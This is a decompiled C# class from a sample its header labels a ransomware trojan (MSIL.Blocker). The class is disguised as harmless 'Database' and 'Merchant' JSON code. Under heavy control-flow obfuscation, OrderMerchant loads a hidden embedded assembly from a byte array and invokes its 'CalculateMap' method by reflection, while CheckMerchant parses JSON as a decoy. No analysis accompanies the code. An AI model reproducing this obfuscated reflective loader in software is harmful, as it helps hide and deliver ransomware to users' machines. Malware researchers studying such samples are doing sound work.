// Decompiled with JetBrains decompiler
// Type: Tsjxretch.Collections.Database
// Assembly: ac, Version=4.10.14393.1198, Culture=neutral, PublicKeyToken=null
// MVID: 71765B6E-1D0D-4AF2-DE12-4A451FD77066
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.09-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-0b19c7363002adca6627b79915e7feb2886b9f55c8af305336ef3992171b0978.exe

using ac.Messages;
using Newtonsoft.Json;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Tsjxretch.Factories;

namespace Tsjxretch.Collections
{
  internal static class Database
  {
    internal static Database MoveDic;

    public static bool OrderMerchant()
    {
      List<Type> typeList1 = new List<Type>();
      if (true)
        goto label_21;
      else
        goto label_19;
label_2:
      Type[] typeArray;
      List<Type> typeList2;
      int num1;
      while (true)
      {
        int num2;
        int index;
        switch (num1)
        {
          case 1:
          case 11:
            if (index >= typeArray.Length)
            {
              num2 = 9;
              break;
            }
            goto case 13;
          case 2:
          case 3:
            if (index >= typeArray.Length)
            {
              num1 = 6;
              continue;
            }
            goto default;
          case 4:
            ++index;
            goto case 1;
          case 5:
            index = 0;
            num1 = 2;
            continue;
          case 6:
            goto label_14;
          case 7:
          case 8:
            if (false)
            {
              num1 = \u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_b51895aa20434242ac4ddb261caaedb6 != 0 ? 1 : 1;
              continue;
            }
            index = 0;
            num1 = 11;
            continue;
          case 9:
            typeArray = typeList2.ToArray();
            if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_88b7b6a34669403eba478564d8d9b335 == 0)
            {
              num1 = 5;
              continue;
            }
            break;
          case 10:
            goto label_19;
          case 12:
            ++index;
            if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_db58b855f26e43158f4c34dfe7f2379b == 0)
            {
              num1 = 3;
              continue;
            }
            break;
          case 13:
            Type type1 = typeArray[index];
            typeList2.Add(type1);
            num1 = \u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_5bff68380c134911847975fbb2a8a118 != 0 ? 1 : 4;
            continue;
          default:
            Type type2 = typeArray[index];
            try
            {
              return (bool) type2.InvokeMember("CalculateMap", BindingFlags.InvokeMethod, (Binder) null, (object) 0, (object[]) null);
            }
            catch
            {
              goto case 12;
            }
        }
        num1 = num2;
      }
label_14:
      return false;
label_19:
      Type[] exportedTypes = Assembly.Load((byte[]) Database.InitDic()).GetExportedTypes();
      if (false)
      {
        num1 = 8;
        goto label_2;
      }
      else
      {
        typeArray = exportedTypes;
        num1 = \u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_fca0e199d3a24a55ab30adaaaa279dea != 0 ? 7 : 5;
        goto label_2;
      }
label_21:
      typeList2 = typeList1;
      num1 = 10;
      goto label_2;
    }

    public static void CheckMerchant()
    {
      int num1 = 7;
label_1:
      int num2 = num1;
      IList<MessageCreatorMessage> messageCreatorMessageList1;
      MessageCreatorMessage messageCreatorMessage1;
      JsonTextReader jsonTextReader1;
      IEnumerator<MessageCreatorMessage> enumerator;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_31;
          case 2:
          case 6:
            Database.CalcDic((object) jsonTextReader1, true);
            goto case 8;
          case 3:
          case 5:
            messageCreatorMessageList1.Add(messageCreatorMessage1);
            goto case 8;
          case 4:
            enumerator = messageCreatorMessageList1.GetEnumerator();
            if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_3af44d15ac5f4a8f8e5b435d4bc2cdf9 != 0)
            {
              num2 = 0;
              continue;
            }
            goto label_1;
          case 7:
            List<MessageCreatorMessage> messageCreatorMessageList2 = new List<MessageCreatorMessage>();
            if (true)
              goto label_29;
label_25:
            JsonTextReader jsonTextReader2 = new JsonTextReader((TextReader) new StringReader("{ 'name': 'Admin' }{ 'name': 'Publisher' }"));
            if (false)
            {
              num2 = 6;
              continue;
            }
            jsonTextReader1 = jsonTextReader2;
            num2 = 2;
            continue;
label_29:
            messageCreatorMessageList1 = (IList<MessageCreatorMessage>) messageCreatorMessageList2;
            goto label_25;
          case 8:
            if (Database.RemoveDic((object) jsonTextReader1))
            {
              MessageCreatorMessage messageCreatorMessage2 = new JsonSerializer().Deserialize<MessageCreatorMessage>((JsonReader) jsonTextReader1);
              if (false)
              {
                num2 = 3;
                continue;
              }
              messageCreatorMessage1 = messageCreatorMessage2;
              num2 = 5;
              continue;
            }
            goto case 4;
          default:
            goto label_8;
        }
      }
label_31:
      return;
label_8:
      try
      {
label_13:
        if (Database.CreateDic((object) enumerator))
          goto label_12;
        else
          goto label_14;
label_10:
        int num3;
        int num4 = num3;
label_11:
        switch (num4)
        {
          case 0:
            return;
          case 1:
            goto label_13;
          default:
            return;
        }
label_12:
        Console.WriteLine((string) Database.VisitDic((object) enumerator.Current));
        num4 = 1;
        if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_2aa2ac6977c345ecaa178b837ac1f190 == 0)
          goto label_11;
        else
          goto label_10;
label_14:
        if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_684c958ac8024c6aae1eb7194d49d093 == 0)
        {
          num4 = 0;
          goto label_11;
        }
        else
          goto label_10;
      }
      finally
      {
        if (enumerator != null)
        {
          int num5 = 0;
          if (\u003CModule\u003E\u007B97c19ca2\u002Dd30d\u002D4926\u002Db319\u002D0f9297a6a699\u007D.m_5c480e29487b4621b917cf3de6fce67d != 0)
            num5 = 0;
          switch (num5)
          {
            default:
              Database.InstantiateDic((object) enumerator);
              break;
          }
        }
      }
    }

    internal static object InitDic() => (object) StateAdapterFactory.CalcMerchant();

    internal static bool EnableDic() => Database.MoveDic == null;

    internal static Database InvokeDic() => Database.MoveDic;

    internal static void CalcDic([In] object obj0, [In] bool obj1) => ((JsonReader) obj0).SupportMultipleContent = obj1;

    internal static bool RemoveDic([In] object obj0) => ((JsonReader) obj0).Read();

    internal static object VisitDic([In] object obj0) => (object) ((MessageCreatorMessage) obj0).ConcatMerchant();

    internal static bool CreateDic([In] object obj0) => ((IEnumerator) obj0).MoveNext();

    internal static void InstantiateDic([In] object obj0) => ((IDisposable) obj0).Dispose();
  }
}
